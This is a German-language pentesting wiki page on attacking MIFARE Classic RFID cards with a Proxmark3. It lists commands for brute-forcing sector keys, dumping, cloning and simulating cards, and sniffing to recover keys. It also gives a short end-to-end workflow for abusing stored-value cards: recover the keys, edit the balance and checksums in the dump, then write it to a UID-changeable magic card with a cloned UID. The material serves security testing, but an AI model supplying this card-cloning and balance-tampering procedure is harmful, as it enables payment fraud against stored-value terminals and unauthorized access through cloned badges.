# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Angriff auf RFID-Systeme mit Proxmark3

Installiere den aktiv gepflegten RRG/Iceman-Proxmark3-Client und die passende Firmware. Überprüfe anschließend die Befehlssyntax mit diesem Build, da sich die unten gezeigten älteren Befehle geändert haben können.<sup>[[1]](#references)[[5]](#references)</sup>

### Angriff auf MIFARE Classic 1KB

MIFARE Classic 1K verfügt über **16 Sektoren** mit jeweils **4 Blöcken** zu **16 Bytes**. Block 0 des Herstellers enthält die UID-/Herstellerdaten und ist auf echten NXP-Karten schreibgeschützt; spezielle Klon- oder „Magic“-Karten erlauben möglicherweise das Überschreiben.<sup>[[1]](#references)[[2]](#references)</sup>\
Für den Zugriff auf jeden Sektor benötigst du **2 Schlüssel** (**A** und **B**). Diese sind in **Block 3 jedes Sektors** (Sector Trailer) gespeichert. Der Sector Trailer speichert außerdem die **Access Bits**, die mithilfe der 2 Schlüssel die **Lese- und Schreibberechtigungen** für **jeden Block** festlegen.\
2 Schlüssel sind beispielsweise nützlich, um Leseberechtigungen zu vergeben, wenn du den ersten Schlüssel kennst, und Schreibberechtigungen, wenn du den zweiten kennst.

Mehrere Angriffe können durchgeführt werden
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Der Proxmark3 ermöglicht weitere Aktionen, etwa das **eavesdropping** einer **Tag-to-Reader-Kommunikation**, um nach sensiblen Daten zu suchen. Bei dieser Karte könntest du die Kommunikation einfach sniffen und den verwendeten Schlüssel berechnen, da die verwendeten **cryptographic operations** schwach sind und du ihn anhand des Klar- und Chiffretexts berechnen kannst (Tool `mfkey64`).<sup>[[3]](#references)</sup>

#### MiFare Classic: Schneller Workflow für den Missbrauch gespeicherter Guthaben

Wenn Terminals Guthaben auf Classic-Karten speichern, sieht ein typischer End-to-End-Flow so aus:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notizen

- `hf mf autopwn` orchestriert verschachtelte Angriffe sowie DarkSide-/HardNested-Angriffe, stellt Schlüssel wieder her und erstellt Dumps im Client-Dumps-Ordner.<sup>[[1]](#references)</sup>
- Das Schreiben von Block 0/UID funktioniert nur bei Magic-Gen1a-/Gen2-Karten. Normale Classic-Karten haben eine schreibgeschützte UID.<sup>[[2]](#references)</sup>
- Viele Deployments verwenden Classic-„Value Blocks“ oder einfache Prüfsummen. Stelle sicher, dass nach der Bearbeitung alle duplizierten/komplementierten Felder und Prüfsummen konsistent sind.<sup>[[4]](#references)</sup>

Eine übergeordnete Methodik und Gegenmaßnahmen findest du unter:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT-Systeme verwenden manchmal **nicht markierte oder nicht kommerzielle Tags**. In diesem Fall kannst du Proxmark3 verwenden, um benutzerdefinierte **Raw Commands an die Tags** zu senden.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quitting Search
```
Mit diesen Informationen könntest du versuchen, Informationen über die Karte und die Art der Kommunikation mit ihr zu suchen. Proxmark3 ermöglicht das Senden von Raw-Befehlen wie: `hf 14a raw -p -b 7 26`

### Skripte

Die Proxmark3-Software enthält eine vorinstallierte Liste von **Automatisierungsskripten**, mit denen du einfache Aufgaben ausführen kannst. Verwende den Befehl `script list`, um die vollständige Liste abzurufen. Verwende anschließend den Befehl `script run`, gefolgt vom Namen des Skripts:
```
proxmark3> script run mfkeys
```
Du kannst ein Script erstellen, um **Tag-Lesegeräte zu fuzz**en. Kopiere dazu die Daten einer **gültigen Karte**, schreibe einfach ein **Lua-Script**, das ein oder mehrere zufällige **Bytes randomisiert**, und überprüfe, ob der **Reader** bei einer Iteration abstürzt.

## References

- [1] [Proxmark3-Wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3-Wiki: HF Magic Cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP-Erklärung zu MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Ausnutzung der NFC-Karten-Schwachstelle in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux-Installation](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
